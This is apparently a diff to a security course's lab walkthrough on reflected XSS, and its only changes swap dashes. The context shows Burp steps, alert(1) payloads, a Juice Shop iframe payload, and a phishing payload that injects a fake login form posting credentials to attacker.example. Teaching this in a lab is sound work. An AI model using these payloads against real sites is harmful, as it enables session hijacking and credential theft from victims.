@@ -1,4 +1,4 @@
-# Week 01: Attack walkthrough — Reflected XSS
+# Week 01: Attack walkthrough - Reflected XSS
 
 > ⚠️ **Lab only.** Everything below targets the PortSwigger Academy lab + Juice Shop running on your machine. Do not point any of these payloads at production systems.
 
@@ -8,11 +8,11 @@
 
 A server takes user-controlled input (typically a query parameter, a header, or a form field) and **reflects it back into the HTML response without escaping it**. If you can put `<script>...</script>` (or anything that triggers JS) into that input, your code runs in the victim's browser when they visit your crafted URL.
 
-The "reflected" in the name means the payload travels with the request — there's no persistent storage of the malicious input on the server side. Compare to **stored XSS** (saved in a database, hits every viewer) in Week 06.
+The "reflected" in the name means the payload travels with the request - there's no persistent storage of the malicious input on the server side. Compare to **stored XSS** (saved in a database, hits every viewer) in Week 06.
 
 ## Step 0: Confirm Burp is intercepting
 
-Open the embedded browser (Proxy → Intercept → Open Browser) and visit any site. In Burp's "HTTP history" sub-tab you should see the requests appearing. If not, your proxy isn't wired up — fix that before continuing.
+Open the embedded browser (Proxy → Intercept → Open Browser) and visit any site. In Burp's "HTTP history" sub-tab you should see the requests appearing. If not, your proxy isn't wired up - fix that before continuing.
 
 ## Step 1: Find the reflection point
 
@@ -33,9 +33,9 @@ In the response body, you'll see something like:
 
 Your input `hello` has been reflected. That's the candidate.
 
-> 💡 **Recognize the pattern:** the value you supplied appears unmodified inside the HTML. If it appeared HTML-escaped (`&lt;hello&gt;`), there'd be no vulnerability — the encoding is the defense.
+> 💡 **Recognize the pattern:** the value you supplied appears unmodified inside the HTML. If it appeared HTML-escaped (`&lt;hello&gt;`), there'd be no vulnerability - the encoding is the defense.
 
-## Step 2: Confirm reflection — break out of the context
+## Step 2: Confirm reflection - break out of the context
 
 Send a search with a special character to see if it's encoded or raw:
 
@@ -73,7 +73,7 @@ URL-encoded for the address bar:
 ?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
 ```
 
-Visit the URL. If the lab is vulnerable, an alert popup appears. That's it — you've achieved arbitrary JavaScript execution in a victim's browser session.
+Visit the URL. If the lab is vulnerable, an alert popup appears. That's it - you've achieved arbitrary JavaScript execution in a victim's browser session.
 
 ```mermaid
 ---
@@ -92,7 +92,7 @@ flowchart LR
     Victim -->|"browser executes<br/>attacker's JS"| Attacker
 ```
 
-## Step 4: Make it useful — beyond alert(1)
+## Step 4: Make it useful - beyond alert(1)
 
 `alert(1)` proves the vuln. The realistic threat is stealing things from the victim's session.
 
@@ -104,7 +104,7 @@ flowchart LR
 
 The victim's browser sends `document.cookie` to your collector. If the session cookie is `Secure` but not `HttpOnly`, you've taken over their session.
 
-### Phishing — inject a fake login
+### Phishing - inject a fake login
 
 ```
 ?search=<script>document.body.innerHTML='<form action=https://attacker.example/login><input name=user><input name=pass type=password><button>Sign in</button></form>'</script>
@@ -144,7 +144,7 @@ Try the search feature in Juice Shop:
 http://localhost:3000/#/search?q=<iframe src="javascript:alert('xss')">
 ```
 
-If you see an alert, you've found the lab's reflected XSS. Juice Shop has multiple XSS challenges of escalating difficulty (DOM, stored, mutation-based) — they're worth working through across the next several weeks.
+If you see an alert, you've found the lab's reflected XSS. Juice Shop has multiple XSS challenges of escalating difficulty (DOM, stored, mutation-based) - they're worth working through across the next several weeks.
 
 ## Variants worth knowing
 
@@ -158,14 +158,14 @@ If you see an alert, you've found the lab's reflected XSS. Juice Shop has multip
 
 ## Real-world bug examples
 
-- [**CVE-2023-49103** (ownCloud)](https://www.cve.org/CVERecord?id=CVE-2023-49103) — illustrative of how reflected user input ends up in unsafe contexts in real apps
-- [**HackerOne — reflected XSS at PayPal**](https://hackerone.com/reports/198945) — a public disclosure example showing the lifecycle from finding to fixing
+- [**CVE-2023-49103** (ownCloud)](https://www.cve.org/CVERecord?id=CVE-2023-49103) - illustrative of how reflected user input ends up in unsafe contexts in real apps
+- [**HackerOne - reflected XSS at PayPal**](https://hackerone.com/reports/198945) - a public disclosure example showing the lifecycle from finding to fixing
 
 ## Common mistakes when learning
 
-- **Stopping at `alert(1)`** — that proves the vuln; do the realistic exploit chain too, so you understand the impact.
-- **Forgetting URL encoding** — payloads need to be URL-encoded when in query strings or the browser interprets them.
-- **Not checking the response context** — XSS is *context-sensitive*. Payload that works in HTML body fails inside `<script>`, inside an attribute, inside a URL, etc.
-- **Ignoring CSP** — many modern apps set Content Security Policy headers; we'll defeat those in Week 06.
+- **Stopping at `alert(1)`** - that proves the vuln; do the realistic exploit chain too, so you understand the impact.
+- **Forgetting URL encoding** - payloads need to be URL-encoded when in query strings or the browser interprets them.
+- **Not checking the response context** - XSS is *context-sensitive*. Payload that works in HTML body fails inside `<script>`, inside an attribute, inside a URL, etc.
+- **Ignoring CSP** - many modern apps set Content Security Policy headers; we'll defeat those in Week 06.
 
-Now read [defense.md](defense.md) for the other side of this — what stops it.
+Now read [defense.md](defense.md) for the other side of this - what stops it.
